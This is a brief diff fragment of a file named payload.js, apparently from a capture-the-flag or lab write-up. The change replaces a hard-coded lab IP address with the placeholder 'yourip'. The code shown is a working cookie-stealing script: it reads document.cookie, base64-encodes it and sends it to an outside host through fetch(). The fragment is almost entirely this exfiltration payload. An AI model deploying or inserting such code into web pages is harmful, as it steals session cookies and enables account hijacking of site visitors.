@@ -15,7 +15,7 @@ This is the payload.js:
 async function getData() {
         var string = document.cookie;
         var encodedString = btoa(string);
-        var url = 'http://10.10.16.37/hello?str=' + encodedString
+        var url = 'http://yourip/hello?str=' + encodedString
         fetch(url).then(function(response) {
                 return;
         }).catch(function(err) {
